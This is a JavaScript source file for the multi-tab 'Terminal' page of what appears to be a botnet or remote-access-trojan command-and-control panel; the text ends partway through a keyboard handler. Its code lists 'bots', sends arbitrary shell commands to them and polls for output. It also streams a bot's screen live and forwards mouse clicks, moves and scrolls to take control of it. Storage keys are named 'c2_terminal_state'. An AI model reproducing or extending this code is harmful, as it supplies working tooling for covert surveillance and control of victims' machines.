// ============================================================
// 💻 Terminal — Multi-Tab + Live + Control + Zoom
// ============================================================
import { getLayout } from "./layout.js";

export function getTerminalPage() {
  const content = `
<div class="page-header" style="margin-bottom:16px;">
  <div class="page-title">TERMINAL</div>
  <div class="page-subtitle">Shell commands with live stream & control</div>
</div>

<div class="terminal-tabs" id="terminalTabs">
  <div style="padding:10px 16px;color:var(--text-mute);font-family:var(--font-mono);font-size:12px;">
    Loading tabs...
  </div>
</div>

<div class="terminals-container" id="terminalsContainer">
  <div class="welcome-terminal">
    <div style="font-family:var(--font-mono);font-size:18px;color:var(--accent-red);margin-bottom:12px;letter-spacing:2px;text-shadow:0 0 20px var(--accent-red);">
      NO TERMINAL OPEN
    </div>
    <div style="font-family:var(--font-mono);font-size:13px;color:var(--text-dim);line-height:1.8;">
      Select a device from
      <a href="/devices" style="color:var(--accent-blue);text-decoration:none;border-bottom:1px dotted var(--accent-blue);">DEVICES</a>
      to open a terminal,<br>
      or use the URL: <span style="color:var(--accent-cyan);">/terminal/&lt;bot_id&gt;</span>
    </div>
  </div>
</div>

<div class="input-bar" id="inputBar" style="display:none;">
  <span class="prompt-symbol" id="promptSymbol">...</span>
  <input type="text" id="cmdInput" placeholder="Enter command..." autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false">
  <button id="sendBtn" onclick="sendCmd()">SEND</button>
</div>

<!-- Live Modal -->
<div class="live-modal-backdrop" id="liveBackdrop" onclick="closeLive()"></div>
<div class="live-modal" id="liveModal">
  <div class="live-header">
    <div class="live-title" id="liveTitle">LIVE VIEW</div>
    <div class="live-controls">
      <span class="live-fps" id="liveFps">-- FPS</span>
      <span class="live-indicator">● LIVE</span>
      <button class="live-close" onclick="closeLive()">X</button>
    </div>
  </div>
  <div class="live-body">
    <img id="liveImg" src="" alt="Live stream">
  </div>
  <div class="live-footer">
    <div style="display:flex;gap:8px;align-items:center;">
      <button class="live-btn" onclick="toggleFullscreen()">FULLSCREEN</button>
      <button class="live-btn" id="controlBtn" onclick="toggleControl()">ENABLE CONTROL</button>
    </div>
    <span style="color:var(--text-dim);font-size:11px;font-family:var(--font-mono);" id="liveStatus">CONTROL: OFF</span>
  </div>
</div>

<style>
.terminal-tabs {
  display: flex;
  gap: 4px;
  padding: 8px;
  background: rgba(0, 0, 0, 0.6);
  border: 1px solid var(--border);
  border-radius: 10px 10px 0 0;
  overflow-x: auto;
  margin-bottom: 0;
  scrollbar-width: thin;
}
.terminal-tabs::-webkit-scrollbar { height: 3px; }
.terminal-tabs::-webkit-scrollbar-thumb { background: var(--accent-blue); border-radius: 2px; }
.terminal-tab {
  display: flex; align-items: center; gap: 8px;
  padding: 8px 14px; background: var(--bg-2); color: var(--text-dim);
  border: 1px solid var(--border); border-radius: 8px; cursor: pointer;
  font-family: var(--font-mono); font-size: 11px; white-space: nowrap;
  transition: all 0.2s; flex-shrink: 0;
}
.terminal-tab:hover { color: var(--text); border-color: var(--accent-blue); background: var(--bg-3); }
.terminal-tab.active {
  background: rgba(0, 102, 255, 0.15); color: var(--accent-red);
  border-color: var(--accent-red); box-shadow: 0 0 15px rgba(255, 0, 64, 0.3);
}
.terminal-tab.online::before {
  content: ''; width: 6px; height: 6px; border-radius: 50%;
  background: var(--green); box-shadow: 0 0 6px var(--green);
  animation: tabPulse 2s infinite; flex-shrink: 0;
}
.terminal-tab.offline::before {
  content: ''; width: 6px; height: 6px; border-radius: 50%;
  background: var(--accent-red); flex-shrink: 0;
}
@keyframes tabPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
.tab-close { color: var(--accent-red); opacity: 0.5; font-weight: 700; font-size: 14px; padding: 0 2px; transition: all 0.15s; }
.tab-close:hover { opacity: 1; transform: scale(1.3); }
.terminals-container {
  position: relative;
  height: calc(100vh - 280px);
  min-height: 400px;
  background: rgba(0, 0, 0, 0.85);
  border: 1px solid var(--border);
  border-top: none;
  border-radius: 0 0 10px 10px;
  overflow: hidden;
}
.welcome-terminal {
  position: absolute; top: 0; left: 0; right: 0; bottom: 0;
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  text-align: center; padding: 40px;
}
.terminal {
  position: absolute; top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0, 0, 0, 0.95); padding: 14px 16px; padding-top: 52px;
  overflow-y: auto; font-family: var(--font-mono); font-size: 13px;
  line-height: 1.6; word-break: break-word; display: none;
}
.terminal.active { display: block; }
.terminal::-webkit-scrollbar { width: 8px; }
.terminal::-webkit-scrollbar-thumb { background: var(--accent-blue); border-radius: 4px; }
.terminal-status-bar {
  position: absolute; top: 8px; right: 8px;
  background: rgba(0, 0, 0, 0.98); border: 1px solid var(--accent-blue);
  border-radius: 8px; padding: 6px 12px; display: flex; gap: 14px;
  align-items: center; font-family: var(--font-mono); font-size: 11px;
  z-index: 10; pointer-events: none;
}
.status-item { display: flex; align-items: center; gap: 5px; }
.status-label { color: var(--text-mute); font-size: 10px; letter-spacing: 0.5px; }
.ping-display { padding: 2px 8px; border-radius: 4px; font-weight: 700; font-size: 11px; min-width: 55px; text-align: center; }
.ping-good { background: rgba(0, 255, 136, 0.15); color: var(--green); border: 1px solid var(--green); }
.ping-ok { background: rgba(255, 204, 0, 0.15); color: var(--yellow); border: 1px solid var(--yellow); }
.ping-mid { background: rgba(255, 102, 0, 0.15); color: var(--orange); border: 1px solid var(--orange); }
.ping-bad { background: rgba(255, 0, 64, 0.15); color: var(--accent-red); border: 1px solid var(--accent-red); }
.ping-offline { background: rgba(80, 80, 80, 0.15); color: #505050; border: 1px solid #505050; }
.uptime-display { font-weight: 700; font-size: 11px; color: var(--green); }
.status-live-btn {
  background: rgba(255, 0, 64, 0.15); border: 1px solid var(--accent-red);
  color: var(--accent-red); padding: 3px 10px; border-radius: 4px;
  font-family: var(--font-mono); font-size: 10px; font-weight: 700;
  cursor: pointer; pointer-events: auto; letter-spacing: 0.5px;
  animation: liveBadgePulse 2s infinite;
}
.status-live-btn:hover { background: var(--accent-red); color: #fff; }
@keyframes liveBadgePulse {
  0%, 100% { box-shadow: 0 0 0 0 rgba(255, 0, 64, 0.4); }
  50% { box-shadow: 0 0 0 6px rgba(255, 0, 64, 0); }
}
.line { margin-bottom: 3px; white-space: pre-wrap; word-wrap: break-word; }
.line.cmd { color: var(--accent-blue); font-weight: 600; margin-top: 10px; text-shadow: 0 0 8px rgba(0, 102, 255, 0.5); }
.line.result { color: #b8d4ff; }
.line.error { color: var(--accent-red); }
.line.info { color: var(--accent-cyan); }
.line.warning { color: var(--yellow); }
.line.system { color: var(--text-mute); font-style: italic; }
.line.success { color: var(--green); }
.input-bar {
  display: flex; gap: 10px; align-items: center; margin-top: 12px;
  padding: 12px; background: rgba(0, 0, 0, 0.8);
  border: 1px solid var(--accent-blue); border-radius: 10px;
}
.prompt-symbol {
  color: var(--accent-blue); font-family: var(--font-mono); font-size: 12px;
  font-weight: 700; flex-shrink: 0; max-width: 40%; overflow: hidden;
  text-overflow: ellipsis; white-space: nowrap; direction: rtl; text-align: left; padding: 0 4px;
}
#cmdInput {
  flex: 1; background: rgba(0, 0, 0, 0.6); border: 1px solid var(--border-hi);
  border-radius: 8px; color: var(--accent-cyan); padding: 12px 14px;
  font-family: var(--font-mono); font-size: 13px; outline: none;
  min-width: 0; transition: all 0.2s;
}
#cmdInput:focus { border-color: var(--accent-blue); box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15); }
#sendBtn {
  background: linear-gradient(135deg, var(--accent-red), var(--accent-blue));
  color: #fff; border: none; border-radius: 8px; padding: 12px 24px;
  font-family: var(--font-mono); font-size: 12px; font-weight: 700;
  letter-spacing: 2px; cursor: pointer; transition: all 0.2s; flex-shrink: 0;
}
#sendBtn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255, 0, 64, 0.4); }
#sendBtn:disabled { opacity: 0.4; cursor: not-allowed; }

/* ═══════════ ZOOM CONTROLS ═══════════ */
.terminal-zoom-controls {
  position: absolute;
  bottom: 12px;
  right: 12px;
  display: flex;
  gap: 4px;
  z-index: 10;
  background: rgba(0, 0, 0, 0.9);
  padding: 4px;
  border-radius: 8px;
  border: 1px solid var(--accent-blue);
}
.zoom-btn {
  width: 32px;
  height: 32px;
  background: transparent;
  border: 1px solid var(--accent-blue);
  color: var(--accent-blue);
  border-radius: 6px;
  cursor: pointer;
  font-size: 16px;
  font-weight: bold;
  display: flex;
  align-items: center;
  justify-content: center;
  user-select: none;
  transition: all 0.15s;
}
.zoom-btn:hover {
  background: var(--accent-blue);
  color: #fff;
}
.zoom-btn:active {
  transform: scale(0.9);
}
.zoom-level {
  display: flex;
  align-items: center;
  padding: 0 10px;
  color: var(--text-dim);
  border-radius: 6px;
  font-family: var(--font-mono);
  font-size: 11px;
  min-width: 50px;
  justify-content: center;
}

/* ═══════════ LIVE MODAL ═══════════ */
.live-modal-backdrop {
  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0, 0, 0, 0.95);
  backdrop-filter: blur(10px);
  z-index: 1000;
  display: none;
}
.live-modal-backdrop.show { display: block; }
.live-modal {
  position: fixed;
  top: 50%; left: 50%;
  transform: translate(-50%, -50%) scale(0.9);
  background: rgba(8, 8, 12, 0.98);
  border: 2px solid var(--accent-red);
  border-radius: 16px;
  z-index: 1001;
  display: none;
  flex-direction: column;
  box-shadow: 0 0 80px rgba(255, 0, 64, 0.5);
  min-width: 400px; max-width: 95vw; max-height: 95vh;
  opacity: 0;
  transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
}
.live-modal.show {
  display: flex;
  opacity: 1;
  transform: translate(-50%, -50%) scale(1);
}
.live-header {
  display: flex; justify-content: space-between; align-items: center;
  padding: 12px 20px;
  border-bottom: 2px solid var(--accent-red);
  background: rgba(0, 0, 0, 0.5);
  border-radius: 14px 14px 0 0;
}
.live-title {
  font-family: var(--font-mono); font-size: 14px; font-weight: 700;
  color: var(--accent-red); letter-spacing: 2px;
  text-shadow: 0 0 15px var(--accent-red);
}
.live-controls { display: flex; gap: 12px; align-items: center; }
.live-indicator {
  color: var(--accent-red); font-family: var(--font-mono); font-size: 11px;
  font-weight: 700; animation: livePulse 1s infinite;
}
@keyframes livePulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
.live-fps {
  font-family: var(--font-mono); font-size: 11px;
  color: var(--green);
  background: rgba(0, 255, 136, 0.1);
  padding: 3px 10px;
  border-radius: 10px;
  border: 1px solid var(--green);
}
.live-close {
  background: none; border: 1px solid var(--accent-red); color: var(--accent-red);
  width: 30px; height: 30px; border-radius: 6px; cursor: pointer; font-size: 14px;
  display: flex; align-items: center; justify-content: center;
}
.live-close:hover { background: var(--accent-red); color: #fff; }
.live-body {
  flex: 1; background: #000; overflow: hidden;
  display: flex; align-items: center; justify-content: center;
  min-height: 300px;
}
#liveImg {
  max-width: 100%; max-height: 80vh; display: block;
  image-rendering: auto; cursor: default;
}
#liveImg.control-on { cursor: crosshair; }
.live-footer {
  display: flex; justify-content: space-between; align-items: center;
  padding: 12px 20px;
  border-top: 1px solid var(--border);
  background: rgba(0, 0, 0, 0.5);
  border-radius: 0 0 14px 14px;
}
.live-btn {
  padding: 8px 16px; background: var(--bg-2);
  border: 1px solid var(--accent-blue); color: var(--accent-blue);
  border-radius: 6px; font-family: var(--font-mono); font-size: 11px;
  font-weight: 600; cursor: pointer; letter-spacing: 1px; transition: all 0.2s;
}
.live-btn:hover { background: var(--accent-blue); color: #fff; }
.live-btn.control-active {
  background: var(--accent-red); color: #fff; border-color: var(--accent-red);
  animation: liveBadgePulse 1.5s infinite;
}
@media (max-width: 768px) {
  .terminals-container { height: calc(100vh - 340px); min-height: 300px; }
  .terminal { font-size: 12px; padding: 10px; padding-top: 50px; }
  .live-modal { min-width: 90vw; }
}
</style>

<script>
var allBots = [];
var terminals = {};
var activeTabs = [];
var selectedBot = null;
var pendingResults = {};
var cmdHistory = {};
var historyIndex = {};
var fontSizes = {};

// Live state
var liveInterval = null;
var liveFrameCount = 0;
var liveLastFpsUpdate = 0;
var controlEnabled = false;
var lastMouseMove = 0;

function loadState() {
  try {
    var saved = localStorage.getItem('c2_terminal_state');
    if (saved) {
      var data = JSON.parse(saved);
      activeTabs = data.activeTabs || [];
      terminals = data.terminals || {};
      cmdHistory = data.cmdHistory || {};
    }
    var savedFonts = localStorage.getItem('c2_font_sizes');
    if (savedFonts) fontSizes = JSON.parse(savedFonts);
  } catch (e) {}
}

function saveState() {
  try {
    var trimmed = {};
    for (var id in terminals) {
      trimmed[id] = {
        cwd: terminals[id].cwd,
        lines: (terminals[id].lines || []).slice(-100),
        lastSeen: terminals[id].lastSeen,
        ping: terminals[id].ping,
      };
    }
    localStorage.setItem('c2_terminal_state', JSON.stringify({
      activeTabs: activeTabs,
      terminals: trimmed,
      cmdHistory: cmdHistory,
    }));
    localStorage.setItem('c2_font_sizes', JSON.stringify(fontSizes));
  } catch (e) {}
}

window.addEventListener('load', function() {
  loadState();
  var path = window.location.pathname;
  if (path.startsWith('/terminal/')) {
    var botId = decodeURIComponent(path.substring('/terminal/'.length));
    if (botId && botId !== '') {
      setTimeout(function() { switchTerminal(botId); }, 200);
    }
  }
  loadBots();
  setInterval(loadBots, 3000);
  setInterval(updateAllUptimes, 1000);
});

async function loadBots() {
  try {
    var res = await fetch('/api/all_bots');
    if (res.status === 401) { window.location.href = '/'; return; }
    allBots = await res.json();
    for (var i = 0; i < allBots.length; i++) {
      var b = allBots[i];
      if (terminals[b.id]) {
        terminals[b.id].lastSeen = b.lastSeen;
        terminals[b.id].ping = b.ping;
        terminals[b.id].isOnline = b.isOnline;
        if (b.cwd) terminals[b.id].cwd = b.cwd;
        updatePingDisplay(b.id, b.ping, b.isOnline);
        updateUptimeDisplay(b.id, b.lastSeen);
      }
    }
    renderTabs();
    updateInputBar();
    if (selectedBot) updatePrompt(selectedBot);
    saveState();
  } catch (e) { console.error(e); }
}

function switchTerminal(botId) {
  if (!terminals[botId]) {
    terminals[botId] = { cwd: '', lines: [], lastSeen: 0, ping: null, isOnline: false };
  }
  if (activeTabs.indexOf(botId) === -1) activeTabs.push(botId);
  selectedBot = botId;
  document.querySelectorAll('.terminal').forEach(function(t) { t.classList.remove('active'); });
  var welcome = document.querySelector('.welcome-terminal');
  if (welcome) welcome.style.display = 'none';
  var term = document.getElementById('term-' + cssSafe(botId));
  if (!term) term = createTerminalDOM(botId);
  term.classList.add('active');
  term.scrollTop = term.scrollHeight;
  renderTabs();
  updateInputBar();
  updatePrompt(botId);
  fetch('/api/bot_info/' + encodeURIComponent(botId))
    .then(function(r) { return r.json(); })
    .then(function(info) {
      if (info && info.cwd && terminals[botId]) {
        terminals[botId].cwd = info.cwd;
        updatePrompt(botId);
        saveState();
      }
    }).catch(function() {});
  var input = document.getElementById('cmdInput');
  if (input) setTimeout(function() { input.focus(); }, 100);
}

function cssSafe(s) {
  return String(s).replace(/[^a-zA-Z0-9_-]/g, '_');
}

function createTerminalDOM(botId) {
  var container = document.getElementById('terminalsContainer');
  var term = document.createElement('div');
  term.className = 'terminal';
  term.id = 'term-' + cssSafe(botId);
  
  // ✅ Apply saved font size
  if (fontSizes[botId]) {
    term.style.fontSize = fontSizes[botId] + 'px';
  }

  var statusBar = document.createElement('div');
  statusBar.className = 'terminal-status-bar';
  statusBar.innerHTML = 
    '<div class="status-item"><span class="status-label">PING</span><span class="ping-display ping-offline" id="ping-' + cssSafe(botId) + '">---</span></div>' +
    '<div class="status-item"><span class="status-label">UPTIME</span><span class="uptime-display" id="uptime-' + cssSafe(botId) + '">0s</span></div>' +
    '<button class="status-live-btn" onclick="event.stopPropagation(); startStreamCmd(\\'' + escapeHtml(botId).replace(/'/g, "\\\\'") + '\\')" title="Live Screen">LIVE</button>';
  term.appendChild(statusBar);

  // ✅ Zoom Controls
  var zoomControls = document.createElement('div');
  zoomControls.className = 'terminal-zoom-controls';
  zoomControls.innerHTML = 
    '<button class="zoom-btn" onclick="changeFontSize(-1, \\'' + escapeHtml(botId).replace(/'/g, "\\\\'") + '\\')">−</button>' +
    '<div class="zoom-level" id="zoom-' + cssSafe(botId) + '">' + (fontSizes[botId] || 13) + 'px</div>' +
    '<button class="zoom-btn" onclick="changeFontSize(1, \\'' + escapeHtml(botId).replace(/'/g, "\\\\'") + '\\')">+</button>';
  term.appendChild(zoomControls);

  if (terminals[botId] && terminals[botId].lines) {
    terminals[botId].lines.forEach(function(l) {
      var line = document.createElement('div');
      line.className = 'line ' + (l.type || 'result');
      line.textContent = l.text;
      term.appendChild(line);
    });
  }

  addLineToDOM(term, '[SYSTEM] Connected to ' + botId, 'system');
  container.appendChild(term);
  return term;
}

// ════════════════════════════════════════════════════════════
// 🔍 Change Font Size
// ════════════════════════════════════════════════════════════
function changeFontSize(delta, botId) {
  var term = document.getElementById('term-' + cssSafe(botId));
  if (!term) return;
  
  if (!fontSizes[botId]) fontSizes[botId] = 13;
  fontSizes[botId] += delta;
  if (fontSizes[botId] < 8) fontSizes[botId] = 8;
  if (fontSizes[botId] > 32) fontSizes[botId] = 32;
  
  term.style.fontSize = fontSizes[botId] + 'px';
  
  var zoomLabel = document.getElementById('zoom-' + cssSafe(botId));
  if (zoomLabel) zoomLabel.textContent = fontSizes[botId] + 'px';
  
  saveState();
}

function addLineToDOM(termEl, text, type) {
  var line = document.createElement('div');
  line.className = 'line ' + (type || 'result');
  line.textContent = text;
  termEl.appendChild(line);
  termEl.scrollTop = termEl.scrollHeight;
}

function logToTerminal(botId, text, type) {
  if (!terminals[botId]) {
    terminals[botId] = { cwd: '', lines: [], lastSeen: 0, ping: null, isOnline: false };
  }
  terminals[botId].lines = terminals[botId].lines || [];
  terminals[botId].lines.push({ text: text, type: type || 'result' });
  if (terminals[botId].lines.length > 200) terminals[botId].lines.shift();
  var term = document.getElementById('term-' + cssSafe(botId));
  if (term) addLineToDOM(term, text, type);
  saveState();
}

function renderTabs() {
  var tabsEl = document.getElementById('terminalTabs');
  if (activeTabs.length === 0) {
    tabsEl.innerHTML = '<div style="padding:10px 16px;color:var(--text-mute);font-family:var(--font-mono);font-size:12px;">No terminals — <a href="/devices" style="color:var(--accent-blue);">Open one from DEVICES</a></div>';
    return;
  }
  var html = '';
  activeTabs.forEach(function(bid) {
    var bot = allBots.find(function(b) { return b.id === bid; });
    var isOnline = bot ? bot.isOnline : false;
    var cls = 'terminal-tab ' + (isOnline ? 'online' : 'offline');
    if (selectedBot === bid) cls += ' active';
    var displayId = bid.length > 22 ? bid.substring(0, 20) + '...' : bid;
    html += '<div class="' + cls + '" onclick="switchTerminal(\\'' + escapeHtml(bid).replace(/'/g, "\\\\'") + '\\')">';
    html += '<span>' + escapeHtml(displayId) + '</span>';
    html += '<span class="tab-close" onclick="event.stopPropagation(); closeTab(\\'' + escapeHtml(bid).replace(/'/g, "\\\\'") + '\\')">x</span>';
    html += '</div>';
  });
  tabsEl.innerHTML = html;
}

function closeTab(botId) {
  var idx = activeTabs.indexOf(botId);
  if (idx > -1) activeTabs.splice(idx, 1);
  var term = document.getElementById('term-' + cssSafe(botId));
  if (term) term.remove();
  if (selectedBot === botId) {
    if (activeTabs.length > 0) {
      switchTerminal(activeTabs[Math.max(0, activeTabs.length - 1)]);
    } else {
      selectedBot = null;
      var welcome = document.querySelector('.welcome-terminal');
      if (welcome) welcome.style.display = 'flex';
      updateInputBar();
    }
  }
  renderTabs();
  saveState();
}

function updateInputBar() {
  var bar = document.getElementById('inputBar');
  var input = document.getElementById('cmdInput');
  var btn = document.getElementById('sendBtn');
  if (selectedBot) {
    bar.style.display = 'flex';
    input.disabled = false;
    btn.disabled = false;
  } else {
    bar.style.display = 'none';
    input.disabled = true;
    btn.disabled = true;
  }
}

function updatePrompt(botId) {
  var prompt = document.getElementById('promptSymbol');
  if (!prompt) return;
  var t = terminals[botId];
  if (t && t.cwd) {
    var cwd = t.cwd;
    if (cwd.length > 30) cwd = '...' + cwd.substr(-28);
    prompt.textContent = cwd + ' >';
  } else {
    prompt.textContent = botId + ' >';
  }
}

function updatePingDisplay(botId, ping, isOnline) {
  var el = document.getElementById('ping-' + cssSafe(botId));
  if (!el) return;
  if (!isOnline) { el.className = 'ping-display ping-offline'; el.textContent = 'OFFLINE'; return; }
  if (ping === null || ping === undefined) { el.className = 'ping-display ping-offline'; el.textContent = '---'; return; }
  var cls = 'ping-bad';
  var text = ping + 'ms';
  if (ping > 999) text = '+999';
  if (ping < 100) cls = 'ping-good';
  else if (ping < 400) cls = 'ping-ok';
  else if (ping < 700) cls = 'ping-mid';
  el.className = 'ping-display ' + cls;
  el.textContent = text;
}

function updateUptimeDisplay(botId, lastSeen) {
  var el = document.getElementById('uptime-' + cssSafe(botId));
  if (!el || !lastSeen) return;
  var elapsed = Math.floor((Date.now() - lastSeen) / 1000);
  var text;
  if (elapsed < 60) text = elapsed + 's';
  else if (elapsed < 3600) text = Math.floor(elapsed / 60) + 'm';
  else if (elapsed < 86400) text = Math.floor(elapsed / 3600) + 'h';
  else text = Math.floor(elapsed / 86400) + 'd';
  el.textContent = text;
  el.style.color = elapsed < 15 ? 'var(--green)' : 'var(--accent-red)';
}

function updateAllUptimes() {
  for (var id in terminals) {
    if (terminals[id].lastSeen) updateUptimeDisplay(id, terminals[id].lastSeen);
  }
}

async function sendCmd() {
  if (!selectedBot) return;
  var input = document.getElementById('cmdInput');
  var cmd = input.value.trim();
  if (!cmd) return;
  var botId = selectedBot;
  var cwd = (terminals[botId] && terminals[botId].cwd) || '...';
  logToTerminal(botId, cwd + ' > ' + cmd, 'cmd');

  cmdHistory[botId] = cmdHistory[botId] || [];
  if (cmdHistory[botId][cmdHistory[botId].length - 1] !== cmd) {
    cmdHistory[botId].push(cmd);
    if (cmdHistory[botId].length > 100) cmdHistory[botId].shift();
  }
  historyIndex[botId] = cmdHistory[botId].length;

  input.value = '';
  saveState();

  try {
    var res = await fetch('/api/send_command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: botId, cmd: cmd })
    });
    var data = await res.json();
    if (data.status === 'error') {
      logToTerminal(botId, '[!] ' + data.message, 'error');
      return;
    }
    pendingResults[data.task_id] = { cmd: cmd, botId: botId };
    pollResult(botId, data.task_id, 0);
  } catch (e) {
    logToTerminal(botId, '[!] Network error', 'error');
  }
}

async function pollResult(botId, taskId, attempts) {
  attempts = attempts || 0;
  if (attempts > 120) {
    logToTerminal(botId, '[!] Timeout', 'error');
    return;
  }
  await new Promise(function(r) { setTimeout(r, 500); });
  try {
    var res = await fetch('/api/get_result/' + encodeURIComponent(botId));
    var data = await res.json();
    if (data.output && data.task_id) {
      if (data.task_id === taskId) {
        logToTerminal(botId, data.output, 'result');
        delete pendingResults[taskId];
        try {
          var infoRes = await fetch('/api/bot_info/' + encodeURIComponent(botId));
          var info = await infoRes.json();
          if (info && info.cwd && terminals[botId]) {
            terminals[botId].cwd = info.cwd;
            if (selectedBot === botId) updatePrompt(botId);
            saveState();
          }
        } catch (err) {}
        return;
      } else {
        pendingResults[data.task_id] = { cmd: null, output: data.output };
      }
    }
    if (pendingResults[taskId] && pendingResults[taskId].output) {
      logToTerminal(botId, pendingResults[taskId].output, 'result');
      delete pendingResults[taskId];
      return;
    }
    pollResult(botId, taskId, attempts + 1);
  } catch (e) {
    pollResult(botId, taskId, attempts + 1);
  }
}

// ════════════════════════════════════════════════════════════
// 📺 Live Stream
// ════════════════════════════════════════════════════════════
function startStreamCmd(botId) {
  fetch('/api/send_command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: botId, cmd: 'livestream 30 40 1280' })
  }).then(function(r) { return r.json(); }).then(function(data) {
    if (data.status === 'error') {
      logToTerminal(botId, '[!] Stream failed: ' + data.message, 'error');
      return;
    }
    logToTerminal(botId, '[SYSTEM] Live stream starting...', 'success');
    setTimeout(function() { openLive(botId); }, 1200);
  }).catch(function(e) {
    logToTerminal(botId, '[!] ' + e.message, 'error');
  });
}

function openLive(botId) {
  if (!botId) botId = selectedBot;
  if (!botId) return;
  document.getElementById('liveTitle').textContent = 'LIVE: ' + botId;
  document.getElementById('liveBackdrop').classList.add('show');
  document.getElementById('liveModal').classList.add('show');
  startLiveStream(botId);
  setTimeout(setupLiveControl, 500);
}

function startLiveStream(botId) {
  stopLiveStream();
  liveFrameCount = 0;
  liveLastFpsUpdate = Date.now();
  liveInterval = setInterval(function() {
    var img = document.getElementById('liveImg');
    var newSrc = '/api/live/' + encodeURIComponent(botId) + '?t=' + Date.now();
    var tmp = new Image();
    tmp.onload = function() {
      img.src = newSrc;
      liveFrameCount++;
      updateLiveFps();
    };
    tmp.onerror = function() {
      img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="640" height="360"><rect width="100%" height="100%" fill="%23000"/><text x="50%" y="50%" fill="%23ff0040" font-family="monospace" font-size="20" text-anchor="middle">NO FRAME</text></svg>';
    };
    tmp.src = newSrc;
  }, 50);
}

function updateLiveFps() {
  var now = Date.now();
  var elapsed = (now - liveLastFpsUpdate) / 1000;
  if (elapsed >= 1) {
    var fps = Math.round(liveFrameCount / elapsed);
    var fpsEl = document.getElementById('liveFps');
    fpsEl.textContent = fps + ' FPS';
    if (fps >= 20) { fpsEl.style.color = 'var(--green)'; fpsEl.style.borderColor = 'var(--green)'; }
    else if (fps >= 10) { fpsEl.style.color = 'var(--yellow)'; fpsEl.style.borderColor = 'var(--yellow)'; }
    else { fpsEl.style.color = 'var(--accent-red)'; fpsEl.style.borderColor = 'var(--accent-red)'; }
    liveFrameCount = 0;
    liveLastFpsUpdate = now;
  }
}

function stopLiveStream() {
  if (liveInterval) { clearInterval(liveInterval); liveInterval = null; }
}

function closeLive() {
  stopLiveStream();
  controlEnabled = false;
  document.getElementById('liveBackdrop').classList.remove('show');
  document.getElementById('liveModal').classList.remove('show');
  document.getElementById('liveImg').classList.remove('control-on');
  document.getElementById('controlBtn').textContent = 'ENABLE CONTROL';
  document.getElementById('controlBtn').classList.remove('control-active');
  document.getElementById('liveStatus').textContent = 'CONTROL: OFF';
  if (selectedBot) {
    fetch('/api/send_command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: selectedBot, cmd: 'control_disable' })
    }).catch(function() {});
    fetch('/api/send_command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: selectedBot, cmd: 'stopstream' })
    }).catch(function() {});
  }
}

function toggleFullscreen() {
  var modal = document.getElementById('liveModal');
  if (!document.fullscreenElement) {
    if (modal.requestFullscreen) modal.requestFullscreen();
  } else {
    document.exitFullscreen();
  }
}

// ════════════════════════════════════════════════════════════
// 🎮 Control
// ════════════════════════════════════════════════════════════
function toggleControl() {
  if (controlEnabled) disableControl();
  else enableControl();
}

function enableControl() {
  controlEnabled = true;
  sendControlCmd('control_enable');
  document.getElementById('liveImg').classList.add('control-on');
  document.getElementById('controlBtn').textContent = 'DISABLE CONTROL';
  document.getElementById('controlBtn').classList.add('control-active');
  document.getElementById('liveStatus').textContent = 'CONTROL: ON';
}

function disableControl() {
  controlEnabled = false;
  sendControlCmd('control_disable');
  document.getElementById('liveImg').classList.remove('control-on');
  document.getElementById('controlBtn').textContent = 'ENABLE CONTROL';
  document.getElementById('controlBtn').classList.remove('control-active');
  document.getElementById('liveStatus').textContent = 'CONTROL: OFF';
}

function sendControlCmd(cmd) {
  if (!selectedBot) return;
  fetch('/api/send_command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: selectedBot, cmd: cmd })
  }).catch(function() {});
}

function setupLiveControl() {
  var img = document.getElementById('liveImg');
  var newImg = img.cloneNode(true);
  img.parentNode.replaceChild(newImg, img);
  newImg.id = 'liveImg';
  
  newImg.addEventListener('click', function(e) {
    if (!controlEnabled) return;
    var rect = newImg.getBoundingClientRect();
    var x = Math.round((e.clientX - rect.left) / rect.width * newImg.naturalWidth);
    var y = Math.round((e.clientY - rect.top) / rect.height * newImg.naturalHeight);
    sendControlCmd('mouse_click ' + x + ' ' + y + ' left');
  });
  
  newImg.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    if (!controlEnabled) return;
    var rect = newImg.getBoundingClientRect();
    var x = Math.round((e.clientX - rect.left) / rect.width * newImg.naturalWidth);
    var y = Math.round((e.clientY - rect.top) / rect.height * newImg.naturalHeight);
    sendControlCmd('mouse_click ' + x + ' ' + y + ' right');
  });
  
  newImg.addEventListener('dblclick', function(e) {
    if (!controlEnabled) return;
    var rect = newImg.getBoundingClientRect();
    var x = Math.round((e.clientX - rect.left) / rect.width * newImg.naturalWidth);
    var y = Math.round((e.clientY - rect.top) / rect.height * newImg.naturalHeight);
    sendControlCmd('mouse_click ' + x + ' ' + y + ' double');
  });
  
  newImg.addEventListener('mousemove', function(e) {
    if (!controlEnabled) return;
    var now = Date.now();
    if (now - lastMouseMove < 100) return;
    lastMouseMove = now;
    var rect = newImg.getBoundingClientRect();
    var x = Math.round((e.clientX - rect.left) / rect.width * newImg.naturalWidth);
    var y = Math.round((e.clientY - rect.top) / rect.height * newImg.naturalHeight);
    sendControlCmd('mouse_move ' + x + ' ' + y);
  });
  
  newImg.addEventListener('wheel', function(e) {
    if (!controlEnabled) return;
    e.preventDefault();
    var rect = newImg.getBoundingClientRect();
    var x = Math.round((e.clientX - rect.left) / rect.width * newImg.naturalWidth);
    var y = Math.round((e.clientY - rect.top) / rect.height * newImg.naturalHeight);
    var amount = e.deltaY < 0 ? 1 : -1;
    sendControlCmd('scroll ' + x + ' ' + y + ' ' + amount);
  }, { passive: false });
}

document.addEventListener('keydown', function(e) {
  if (!controlEnabled) return;
  var modal = document.getElementById('liveModal');
